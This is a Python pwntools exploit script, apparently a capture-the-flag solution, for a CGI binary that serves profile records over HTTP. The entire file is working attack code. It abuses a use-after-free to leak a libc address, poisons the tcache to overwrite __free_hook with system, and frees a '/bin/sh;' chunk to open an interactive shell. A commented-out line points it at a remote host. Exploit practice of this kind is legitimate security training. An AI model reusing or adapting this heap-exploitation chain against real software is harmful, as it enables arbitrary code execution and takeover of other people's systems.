from pwn import *

context.log_level = "debug"
sh = process("./cgi")
# sh=remote("175.20.8.30",9999)

def my_encode(bytes_str):
    res=""
    for i in bytes_str:
        res+='%'+hex(i)[2:].rjust(2,'0')
    print(res)
    return res
def my_encode_str(str):
    res=""
    for i in str:
        res+='%'+hex(ord(i))[2:].rjust(2,'0')
    print(res)
    return res
    
http_head="HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
def add(id, name, passwd):
    sh.send(f"PUT /profile?id={id} ".encode()+http_head.encode()+f"name={name}&password={passwd}&password_length={len(passwd)}".encode())

def show(id):
    sh.send(f"GET /profile?id={id} ".encode()+http_head.encode())

def edit(id, name, passwd):
    sh.send(f"POST /profile?id={id} ".encode()+http_head.encode()+f"name={name}&password={passwd}".encode())

def delete(id):
    sh.send(f"DELETE /profile?id={id} ".encode()+http_head.encode())


add(0,"nihao0","b"*0x420)
add(1,"nihao1","b"*0x30)

delete(0)
show(0)
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base=leak_libc-0x1ecbe0
success("leak_libc:"+hex(leak_libc))
success("libc_base:"+hex(libc_base))

libc=ELF("./libc-2.31.so")
libc.address=libc_base
system=libc.sym['system']
free_hook=libc.sym['__free_hook']

add(2,"nihao2","b"*0x60)
add(3,"nihao3","b"*0x60)
add(4,"nihao4","b"*0x60)

delete(2)
delete(3)

edit(3,"nihao4",my_encode(p64(free_hook)))
delete(1)

add(5,"/bin/sh;",b'/bin/sh;'+b'b'*(0x60-0x8))
add(6,"nihao7",my_encode(p64(system)).ljust(0x60,'\x08'))
# add(6,"nihao8",my_encode(p64(system)).ljust(0x60,'\x08'))
# gdb.attach(sh)

delete(5)
sh.interactive()
